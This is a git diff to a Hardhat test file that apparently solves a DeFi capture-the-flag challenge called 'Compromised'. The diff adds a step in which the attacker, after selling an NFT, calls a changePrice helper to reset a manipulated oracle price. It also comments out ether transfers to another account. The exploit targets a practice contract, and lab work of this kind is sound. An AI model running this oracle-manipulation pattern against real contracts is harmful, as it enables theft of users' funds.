@@ -1,3 +1,4 @@
+const { executeContractCallWithSigners } = require('@gnosis.pm/safe-contracts');
 const { expect } = require('chai');
 const { ethers, web3} = require('hardhat');
 
@@ -157,10 +158,18 @@ describe('Compromised challenge', function () {
 
           await this.exchange.connect(attacker).sellOne(FIRST_TOKEN_ID);
 
-          await attacker.sendTransaction({
-            to: someacc.address,
-            value: ethers.utils.parseEther(ethers.utils.formatEther(ethers.BigNumber.from('1'))),
-          });
+          await changePrice(INITIAL_NFT_PRICE);
+
+          // await attacker.sendTransaction({
+          //   to: someacc.address,
+            // value: ethers.utils.parseEther(ethers.utils.formatEther(ethers.BigNumber.from('1'))),
+          // });
+
+        //   await web3.eth.sendTransaction({
+        //     from: attacker.address,
+        //     to: someacc.address,
+        //     value: ethers.BigNumber.from('8991000000000000000000')
+        // });
       
     });
 
